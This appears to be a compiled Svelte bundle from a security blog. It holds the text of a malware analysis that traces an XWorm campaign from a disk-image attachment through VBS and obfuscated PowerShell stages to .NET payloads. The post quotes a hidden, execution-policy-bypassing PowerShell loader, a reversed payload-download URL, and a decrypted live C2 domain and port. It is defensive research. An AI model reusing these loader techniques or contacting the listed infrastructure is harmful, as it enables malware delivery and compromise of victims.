Pn={};c&2&&(Pn.$$scope={dirty:c,ctx:o}),T.$set(Pn)},i(o){ne||($(T.$$.fragment,o),$(w.$$.fragment,o),$(_.$$.fragment,o),$(Es.$$.fragment,o),$(vn.$$.fragment,o),ne=!0)},o(o){B(T.$$.fragment,o),B(w.$$.fragment,o),B(_.$$.fragment,o),B(Es.$$.fragment,o),B(vn.$$.fragment,o),ne=!1},d(o){o&&(n(s),n(a),n(l),n(p),n(h),n(b),n(R),n(C),n(k),n(D),n(P),n(A),n(H),n(j),n(S),n(I),n(Ks),n(J),n(gs),n(_s),n(Bl),n(Ys),n(fl),n(bs),bl.d(),n(es),n(Zs),n(ws),n(Bs),n(Xs),n(hl),n(Ds),n(Js),n(Is),n(ss),n(Ls),Dl.d(),n(os),n(sl),n(ts),Ll.d(),n(ps),n(Ps),n(Y),n(ll),n(Ts),Tl.d(),n(Fs),n(nl),n(Rs),n(ls),n(As),n(el),n(Os),n(Z),n(Cs),n(al),n(ol),Kl.d(),n(rs),n(tl),n(Ns),n(q),n(is),n(Us),n(ks),n(pl),n(Fl),sn.d(),n(cs),n(rl),n(Ws),n(X),n(Vs),n(ns),n(Ss),Al.d(),n(js),n(ml),n(xs),n(il),n(cl),tn.d(),n(ys),n(yl),n(ds),n(vs),n(Ms),n(zs),n($s),n(dl),n(r),g.d(),n(kl),n(vl),n(dn),n(ul),n(Vn),n(Cn),n(jn),n(un),n(zn),n(fn),n(Gn),n(gl),n(qn),n(Sl),n(Kn),n(hn),n(Qn),n(mn),n(Yn),n(xl),n(Zn),n(gn),n(Xn),n(Ml),n(Jn),n(_n),n(se),n(En),n(le),n(bn)),N(T,o),N(w),N(_),N(Es,o),N(vn)}}}function Ia(i){let s,e;const a=[i[0],re];let l={$$slots:{default:[Ba]},$$scope:{ctx:i}};for(let t=0;t<a.length;t+=1)l=_l(l,a[t]);return s=new ye({props:l}),{c(){U(s.$$.fragment)},l(t){V(s.$$.fragment,t)},m(t,p){W(s,t,p),e=!0},p(t,[p]){const h=p&1?ce(a,[p&1&&Hn(t[0]),p&0&&Hn(re)]):{};p&2&&(h.$$scope={dirty:p,ctx:t}),s.$set(h)},i(t){e||($(s.$$.fragment,t),e=!0)},o(t){B(s.$$.fragment,t),e=!1},d(t){N(s,t)}}}const re={title:"Demystifying CVE-2025-47987",image:"/demystifying-CVE-2025-47987/image-cve1.png",created:"2025-07-10T00:00:00.000Z",updated:"2025-07-10T00:00:00.000Z",tags:["CVE-2025-47987","Reverse Engineering","Windows"],images:[],slug:"/demystifying-CVE-2025-47987/+page.svelte.md",path:"/blog/demystifying-CVE-2025-47987",toc:[{depth:2,slug:"client-authentication-architecture",title:"Client Authentication Architecture"},{depth:2,slug:"root-cause",title:"Root Cause"},{depth:2,slug:"building-a-poc-crash",title:"Building a PoC Crash"},{depth:3,slug:"reaching-tsinitcertcreds",title:"Reaching TSInitCertCreds()"},{depth:4,slug:"crafting-a-valid-packed-kerbcertlogonbuffer",title:"Crafting a valid packed KerbCertLogonBuffer"},{depth:3,slug:"reaching-the-vulnerable-function",title:"Reaching the vulnerable function"},{depth:4,slug:"crafting-a-valid-csp-buffer",title:"Crafting a valid CSP buffer"},{depth:3,slug:"triggering-the-bug",title:"Triggering the bug"},{depth:2,slug:"exploitation-ideas",title:"Exploitation Ideas"},{depth:2,slug:"conclusion",title:"Conclusion"},{depth:2,slug:"references",title:"References"}]},{title:po,image:Fo,created:ro,updated:io,tags:co,alt:yo,audio:vo,images:uo,lang:fo,video:ho,slug:mo,path:go,toc:_o}=re;function Pa(i,s,e){return i.$$set=a=>{e(0,s=_l(_l({},s),$n(a)))},s=$n(s),[s]}let Eo=class extends us{constructor(s){super(),fs(this,s,Pa,Ia,hs,{})}};function Ra(i){let s,e='<a href="#introduction">Introduction</a>',a,l,t="Hello there, welcome to the board! I’m openning this blog series with an exciting topic: malware analysis. I will start by collecting pieces for our puzzle and continue to combine them until, by the end of journey, each piece contributes to the bigger picture.",p,h,v='<a href="https://bazaar.abuse.ch/" rel="nofollow noopener noreferrer external" target="_blank"><em>MalwareBazaar</em></a> website provides a large database of malware samples, where researchers can report different files which might seem suspicious. Today, while I was searching for potential subject for analysis, I stumbled upon an interesting archive. This was found as part of an email attachment in a malware campaign. The sample can be found <a href="https://bazaar.abuse.ch/sample/76fbfcb8754ba7e23c855a71db83aae75c106d84e106330b772cf3a28a440993/#comments" rel="nofollow noopener noreferrer external" target="_blank">here</a>.',b,T,R='<a href="#first-sign-of-malicious-code">First sign of malicious code</a>',C,w,k="The initial archive contains a disk image <code>.img</code> file, a known format for executing code once the victim clicks the file. If this is not yet suspicious, let’s inspect for visible signs that might indicate unwanted behaviour such as download links. For this step, I used a powerful utiliy called <code>binwalk</code>, capable of extracting bundled files.",D,x,P=`<pre class="shiki monokai with-title" style="background-color: #272822; color: #F8F8F2" bash="true" title="extract files from disk image"><div class='code-title'>extract files from disk image</div><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #F8F8F2">binwalk -e Damaged_item.img</span></div></code></div></pre>`,A,_,H="Now, a new folder <code>iso-root</code> contains a friendly-looking <code>VBS</code> script.",j,O,S,I,as,Ks="The script simply tries to download the content found at a Pastebin link and then execute the fetched code using <code>ExecuteGlobal</code> function. Good news, the link was suspended and therefore, the following code cannot be executed anymore, preventing victims from infection. Defenders and Pastebin support did great work in such a short period of time (less than 18h :)). Fortunately, I was able to extract the next stage of <code>VBS</code> code (the code from Pastebin link) before removal. Let’s analyse it!",J,ms,gs,_s,Qs,Bl="We are dealing with some obfuscation, so it would be faster if we can find a way to print the final code (after deobfuscation, but before execution). This way, we can get a clear understanding of what’s under the hood. Some hints suggest that deobfuscated code is powershell. The plan is to write the final code to a powershell script.",Es,Ys,fl=`<pre class="shiki monokai with-title" style="background-color: #272822; color: #F8F8F2" vb="true" title="code appended to the end of obfuscated VBS"><div class='code-title'>code appended to the end of obfuscated VBS</div><div class="language-id">vb</div><div class='code-container'><code><div class='line'><span style="color: #66D9EF">Set </span><span style="color: #F8F8F2">fso </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">CreateObject</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Scripting.FileSystemObject"</span><span style="color: #F8F8F2">)</span></div><div class='line'><span style="color: #66D9EF">Set </span><span style="color: #F8F8F2">outputFile </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> fso.</span><span style="color: #A6E22E">CreateTextFile</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"deobfuscated.ps1"</span><span style="color: #F8F8F2">,</span><span style="color: #AE81FF"> True</span><span style="color: #F8F8F2">)</span></div><div class='line'><span style="color: #F8F8F2">outputFile.WriteLine durguete</span></div></code></div></pre>`,El,bs,bl="Once we append this code and execute the whole script, <code>deobfuscated.ps1</code> file will help us in the next stage.",wn,es,Zs='<a href="#new-language-old-friend">New language, old friend</a>',Il,ws,Bs="It becomes clear that attacker tries to hide as much as possible by adding polimorphic code, with many layers of obfuscation. The recovered <code>PS1</code> script replaces some substrings in <code>$codigo</code> variable, decodes it in <code>base64</code> and executes the code using a classic powershell technique.",Pl,Xs,hl=`<pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" powershell="true"><div class="language-id">powershell</div><div class='code-container'><code><div class='line'><span style="color: #F8F8F2">powershell </span><span style="color: #F92672">-</span><span style="color: #F8F8F2">command </span><span style="color: #E6DB74">"</span><span style="color: #F8F8F2">$codigo</span><span style="color: #E6DB74"> = 'ZgB1DgTreG4DgTreYwB0DgTreGkDgTrebw &lt;-- stripped --&gt; eKQB9DgTreCDgTreDgTrefQDgTre=';</span><span style="color: #F8F8F2">$oWjuxd</span><span style="color: #E6DB74"> = [system.Text.encoding]::Unicode.GetString([system.convert]::Frombase64string( </span><span style="color: #F8F8F2">$codigo</span><span style="color: #E6DB74">.replace('DgTre','A') ));powershell.exe -windowstyle hidden -executionpolicy bypass -Noprofile -command </span><span style="color: #F8F8F2">$OWjuxD</span><span style="color: #E6DB74">"</span></div></code></div></pre>`,wl,Ds,Js="After decoding, we are left with another powershell script. It is more verbose than the previous one.",Rl,Is,ss,Ol,Ls,Dl="Let’s break it into smaller pieces. The variable <code>@links</code>  contains links used by <code>DownloadDataFromLinks()</code> function to download an image (chosen at random). Now comes the interesting part. The actual downloaded image contain an embedded <code>.NET</code> assembly (<code>$loadedAssembly</code> and <code>GetMethod</code> are clear signs that we are dealing with .NET code). I will adapt this PS1 script such that, after downloading and decoding are complete, variable <code>$commandBytes</code> will write its content to an output file <code>malware-net</code>. Below is a small snippet of what’s being changed in the original code:",Dn,os,sl='Additional decoding is required in order to extract the assembly properly. For that, <code>CyberChef</code> tool will simplify things a lot using this <a href="https://gchq.github.io/CyberChef/#recipe=Decode_text(&#39;UTF-16LE%2520(1200)&#39;)Find_/_Replace(%257B&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;%255C%255Cr%255C%255Cn&#39;%257D,&#39;%2520&#39;,true,false,true,false)From_Decimal(&#39;Space&#39;,false)" rel="nofollow noopener noreferrer external" target="_blank">recipe</a>.',Nl,ts,Ll='<a href="#decompiling-the-culprit">Decompiling the culprit</a>',Ln,ps,Ps="We take a look at the first bytes and notice that they represent the file signature for an executable <code>.EXE</code>. Inspect it’s properties to gain new insights.",Ul,Y,ll,Wl,Ts,Tl="Seems like this campaign is addressed to spanish speaking victims. Maybe it was sent to employees of some companies since the description is related to an <code>Automation project</code>?",Tn,Fs,nl='So far, the executable won’t pose dificulties because it’s written in an intepreted language, making it easier to retrieve the original code. <a href="https://github.com/icsharpcode/ILSpy0" rel="nofollow noopener noreferrer external" target="_blank"><em>ILSpy</em></a> is a great tool for decompiling .NET binaries, suitable for our purpose. (Open the image in a new tab if you don’t see the code)',Vl,Rs,ls,jl,As,el="This is one functionality of the binary through which the malware tries to gain persistence by abusing widely-known start-up registry <code>SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code>. Other functionalities found include: using D/Invoke syscall, creating new processes under the path of <code>cmd.exe</code> and another one related to .NET framework.",zl,Os,Z,Gl,Cs,al="Remember that in previously discussed powershell script, a method was invoked on this assembly, <code>VAI</code>:",ql,ol,Kl=`<pre class="shiki monokai with-title" style="background-color: #272822; color: #F8F8F2" powershell="true" title="snipped from second powershell script"><div class='code-title'>snipped from second powershell script</div><div class="language-id">powershell</div><div class='code-container'><code><div class='line'><span style="color: #F8F8F2">$method </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> $type.GetMethod(</span><span style="color: #E6DB74">'VAI'</span><span style="color: #F8F8F2">).Invoke(</span><span style="color: #AE81FF">$null</span><span style="color: #F92672">,</span><span style="color: #F8F8F2"> [</span><span style="color: #66D9EF">object</span><span style="color: #F8F8F2">[]](</span><span style="color: #E6DB74">'441ae23bb6fe-0269-74a4-c2ae-4ebc2dab=nekot&aidem=tla?txt.102061mrowxnhoj/o/moc.topsppa.64038-metsys-eciovni/b/0v/moc.sipaelgoog.egarotsesaberif//:sptth'</span><span style="color: #F92672">,</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">'1'</span><span style="color: #F92672">,</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">'C:ProgramData'</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">,</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">'Name '</span><span style="color: #F92672">,</span><span style="color: #E6DB74">' AddInProcess32 '</span><span style="color: #F92672">,</span><span style="color: #E6DB74">' '</span><span style="color: #F8F8F2">))&#125; &#125;</span></div></code></div></pre>`,Ql,rs,tl="In ILSpy, we can see that <code>VAI</code> is responsible for reversing and downloading the file from link. After that, the file obtained is reversed and decoded in base64.",Yl,Ns,q,Zl,is,Us='<a href="#searching-for-keys">Searching for keys?</a>',Xl,ks,pl="This hunting brought us to a new .NET binary. We can confirm its signature:",Jl,Fl,sn=`<pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line highlight'><span style="color: #F8F8F2">$ file mal2.exe</span></div><div class='line dim'><span style="color: #F8F8F2">mal2.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, </span><span style="color: #F92672">for</span><span style="color: #F8F8F2"> MS Windows, 3 sections</span></div></code></div></pre>`,ln,cs,rl="Through decompilation, we find a vast number of functions related to malitious behaviour. In <code>Main</code> function, some variables are decrypted using <code>AES</code> in <code>ECB mode</code>. These “setting” variables will be used later in establishing connections between victim and attacker’s C&amp;C infrastructure.",nn,Ws,X,en,Vs,ns,an,Ss,Al="Based on the known values of encrypted strings and encoded key, it is possible to recover the plaintext values using a similar decryption routine used in encryption:",An,js,ml=`<pre class="shiki monokai" style="background-color: #272822; color: #F8F8F2" csharp="true"><div class="language-id">csharp</div><div class='code-container'><code><div class='line'><span style="color: #F92672">using</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">System</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F92672">using</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">System</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">Security</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">Cryptography</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F92672">using</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">System</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">Text</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">class</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Settings</span></div><div class='line'><span style="color: #F8F8F2">&#123;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> Host </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"8wEbreuCNstcX+VMVrMtN79nabenssi23ZA2UwI0sBw="</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> Port </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"NHj6D/XmlURhrDZN4bCpqA=="</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> KEY </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"tGwHQrFuqEZ9E5eQxvPElQ=="</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> SPL </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"A6XU+/uh3DsQy74ojVhAhQ=="</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">int</span><span style="color: #F8F8F2"> Sleep </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">3</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> USBNM </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"k6tUhyBB8c9OnCp0im2vjw=="</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> Mutex </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"mrkh245537gVoEKF"</span><span style="color: #F8F8F2">;</span></div><div class='line'><span style="color: #F8F8F2">&#125;</span></div><div class='line'><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">class</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">AlgorithmAES</span></div><div class='line'><span style="color: #F8F8F2">&#123;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Decrypt</span><span style="color: #F8F8F2">(</span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> input)</span></div><div class='line'><span style="color: #F8F8F2">    &#123;</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #A6E22E">RijndaelManaged</span><span style="color: #F8F8F2"> rijndaelManaged </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">RijndaelManaged</span><span style="color: #F8F8F2">();</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #A6E22E">MD5CryptoServiceProvider</span><span style="color: #F8F8F2"> mD5CryptoServiceProvider </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">MD5CryptoServiceProvider</span><span style="color: #F8F8F2">();</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[] array </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[</span><span style="color: #AE81FF">32</span><span style="color: #F8F8F2">];</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[] sourceArray </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> mD5CryptoServiceProvider.</span><span style="color: #A6E22E">ComputeHash</span><span style="color: #F8F8F2">(</span><span style="color: #A6E22E">UTF8SB</span><span style="color: #F8F8F2">(Settings.Mutex));</span></div><div class='line'><span style="color: #F8F8F2">        Array.</span><span style="color: #A6E22E">Copy</span><span style="color: #F8F8F2">(sourceArray, </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, array, </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, </span><span style="color: #AE81FF">16</span><span style="color: #F8F8F2">);</span></div><div class='line'><span style="color: #F8F8F2">        Array.</span><span style="color: #A6E22E">Copy</span><span style="color: #F8F8F2">(sourceArray, </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, array, </span><span style="color: #AE81FF">15</span><span style="color: #F8F8F2">, </span><span style="color: #AE81FF">16</span><span style="color: #F8F8F2">);</span></div><div class='line'><span style="color: #F8F8F2">        rijndaelManaged.Key </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> array;</span></div><div class='line'><span style="color: #F8F8F2">        rijndaelManaged.Mode </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> CipherMode.ECB;</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #A6E22E">ICryptoTransform</span><span style="color: #F8F8F2"> cryptoTransform </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> rijndaelManaged.</span><span style="color: #A6E22E">CreateDecryptor</span><span style="color: #F8F8F2">();</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[] array2 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> Convert.</span><span style="color: #A6E22E">FromBase64String</span><span style="color: #F8F8F2">(input);</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[] decryptedBytes </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> cryptoTransform.</span><span style="color: #A6E22E">TransformFinalBlock</span><span style="color: #F8F8F2">(array2, </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, array2.Length);</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">UTF8BS</span><span style="color: #F8F8F2">(decryptedBytes);</span></div><div class='line'><span style="color: #F8F8F2">    &#125;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">private</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[] </span><span style="color: #A6E22E">UTF8SB</span><span style="color: #F8F8F2">(</span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> s)</span></div><div class='line'><span style="color: #F8F8F2">    &#123;</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> Encoding.UTF8.</span><span style="color: #A6E22E">GetBytes</span><span style="color: #F8F8F2">(s);</span></div><div class='line'><span style="color: #F8F8F2">    &#125;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">private</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">string</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">UTF8BS</span><span style="color: #F8F8F2">(</span><span style="color: #F92672">byte</span><span style="color: #F8F8F2">[] b)</span></div><div class='line'><span style="color: #F8F8F2">    &#123;</span></div><div class='line'><span style="color: #F8F8F2">        </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> Encoding.UTF8.</span><span style="color: #A6E22E">GetString</span><span style="color: #F8F8F2">(b);</span></div><div class='line'><span style="color: #F8F8F2">    &#125;</span></div><div class='line'><span style="color: #F8F8F2">&#125;</span></div><div class='line'><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">class</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Main2</span></div><div class='line'><span style="color: #F8F8F2">&#123;</span></div><div class='line'><span style="color: #F8F8F2">    </span><span style="color: #F92672">public</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">static</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">void</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Main</span><span style="color: #F8F8F2">()</span></div><div class='line'><span style="color: #F8F8F2">    &#123;</span></div><div class='line'><span style="color: #F8F8F2">        Settings.Host </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> AlgorithmAES.</span><span style="color: #A6E22E">Decrypt</span><span style="color: #F8F8F2">(Settings.Host);</span></div><div class='line'><span style="color: #F8F8F2">        Console.</span><span style="color: #A6E22E">WriteLine</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Decrypted Host: "</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> Settings.Host);</span></div><div class='line'><span style="color: #F8F8F2">        Settings.Port </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> AlgorithmAES.</span><span style="color: #A6E22E">Decrypt</span><span style="color: #F8F8F2">(Settings.Port);</span></div><div class='line'><span style="color: #F8F8F2">        Console.</span><span style="color: #A6E22E">WriteLine</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Decrypted Port: "</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> Settings.Port);</span></div><div class='line'><span style="color: #F8F8F2">        Settings.KEY </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> AlgorithmAES.</span><span style="color: #A6E22E">Decrypt</span><span style="color: #F8F8F2">(Settings.KEY);</span></div><div class='line'><span style="color: #F8F8F2">        Console.</span><span style="color: #A6E22E">WriteLine</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Decrypted KEY: "</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> Settings.KEY);</span></div><div class='line'><span style="color: #F8F8F2">        Settings.SPL </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> AlgorithmAES.</span><span style="color: #A6E22E">Decrypt</span><span style="color: #F8F8F2">(Settings.SPL);</span></div><div class='line'><span style="color: #F8F8F2">        Console.</span><span style="color: #A6E22E">WriteLine</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Decrypted SPL: "</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> Settings.SPL);</span></div><div class='line'><span style="color: #F8F8F2">        Settings.USBNM </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> AlgorithmAES.</span><span style="color: #A6E22E">Decrypt</span><span style="color: #F8F8F2">(Settings.USBNM);</span></div><div class='line'><span style="color: #F8F8F2">        Console.</span><span style="color: #A6E22E">WriteLine</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Decrypted USBNM: "</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> Settings.USBNM);</span></div><div class='line'><span style="color: #F8F8F2">    &#125;</span></div><div class='line'><span style="color: #F8F8F2">&#125;</span></div></code></div></pre>`,Cl,xs,il="Finally, we can reveal the malware family used by threat actors:",on,cl,tn=`<pre class="shiki monokai with-title" style="background-color: #272822; color: #F8F8F2" txt="true" title="decrypted strings"><div class='code-title'>decrypted strings</div><div class="language-id">txt</div><div class='code-container'><code><div class='line dim'><span style="color: undefined">Decrypted Host: xwv5group7001.duckdns.org</span></div><div class='line dim'><span style="color: undefined">Decrypted Port: 7001</span></div><div class='line dim'><span style="color: undefined">Decrypted KEY: &lt;123456789&gt;</span></div><div class='line highlight'><span style="color: undefined">Decrypted SPL: &lt;Xwormmm&gt;</span></div><div class='line dim'><span style="color: undefined">Decrypted USBNM: USB.exe</span></div></code></div></pre>`,pn,ys,yl='Taking a closer look at its functions in ILSpy, we find that it’s indeed <code>XWorm</code>. On internet, there is already a lot of research done on this malware. Even though, I will mention some of its capabilities: recording keystrokes, printscreens at specific interval of time and sending them to the attacker at random time (this jitter can be useful for bypassing network monitoring solutions). <code>Trellix</code> covered more rigorously this topic <a href="https://www.trellix.com/blogs/research/old-loader-new-threat-exploring-xworm/" rel="nofollow noopener noreferrer external" target="_blank">here</a>.',Fn,ds,vs='<a href="#conclusion">Conclusion</a>',rn,Ms,zs="The hunt is not over yet since we have valuable informations to work with. For instance, <code>xwv5group7001.duckdns.org</code> is a domain name registered by the attacker. It might provide additional information about his real identity, through OSINT techniques. Maybe the C2 infrastructured is poorly configured, leaving it vulnerable to attacks from defenders who are investigating this case. What about other clues left behind during this analysis process?",cn,$s,dl="Our jorney will end here for now, but it is worth investigating what hasn’t been covered in this post. Sometimes you end up finding interesting information:). Thank you for your undivided attention during this reading and don’t hesitate to contact me on social media for questions or feedback. Best wishes until next time!",yn;return S=new Gs({props:{src:"damaged-itemvbs.png"}}),gs=new Gs({props:{src:"fetched-vbs.png"}}),ss=new Gs({props:{src:"deobfs2.png"}}),ls=new Gs({props:{src:"decompiled1.png"}}),Z=new Gs({props:{src:"malhelper.png"}}),q=new Gs({props:{src:"toolsmal.png"}}),X=new Gs({props:{src:"worm1.png"}}),ns=new Gs({props:{src:"worm2.png"}}),{c(){s=d("h2"),s.innerHTML=e,a=f(),l=d("p"),l.textContent=t,p=f(),h=d("p"),h.innerHTML=v,b=f(),T=d("h2"),T.innerHTML=R,C=f(),w=d("p"),w.innerHTML=k,D=f(),x=new Q(!1),A=f(),_=d("p"),_.innerHTML=H,j=f(),O=d("p"),U(S.$$.fragment),I=f(),as=d("p"),as.innerHTML=Ks,J=f(),ms=d("p"),U(gs.$$.fragment),_s=f(),Qs=d("p"),Qs.textContent=Bl,Es=f(),Ys=new Q(!1),El=f(),bs=d("p"),bs.innerHTML=bl,wn=f(),es=d("h2"),es.innerHTML=Zs,Il=f(),ws=d("p"),ws.innerHTML=Bs,Pl=f(),Xs=new Q(!1),wl=f(),Ds=d("p"),Ds.textContent=Js,Rl=f(),Is=d("p"),U(ss.$$.fragment),Ol=f(),Ls=d("p"),Ls.innerHTML=Dl,Dn=f(),os=d("p"),os.innerHTML=sl,Nl=f(),ts=d("h2"),ts.innerHTML=Ll,Ln=f(),ps=d("p"),ps.innerHTML=Ps,Ul=f(),Y=d("img"),Wl=f(),Ts=d("p"),Ts.innerHTML=Tl,Tn=f(),Fs=d("p"),Fs.innerHTML=nl,Vl=f(),Rs=d("p"),U(ls.$$.fragment),jl=f(),As=d("p"),As.innerHTML=el,zl=f(),Os=d("p"),U(Z.$$.fragment),Gl=f(),Cs=d("p"),Cs.innerHTML=al,ql=f(),ol=new Q(!1),Ql=f(),rs=d("p"),rs.innerHTML=tl,Yl=f(),Ns=d("p"),U(q.$$.fragment),Zl=f(),is=d("h2"),is.innerHTML=Us,Xl=f(),ks=d("p"),ks.textContent=pl,Jl=f(),Fl=new Q(!1),ln=f(),cs=d("p"),cs.innerHTML=rl,nn=f(),Ws=d("p"),U(X.$$.fragment),en=f(),Vs=d("p"),U(ns.$$.fragment),an=f(),Ss=d("p"),Ss.textContent=Al,An=f(),js=new 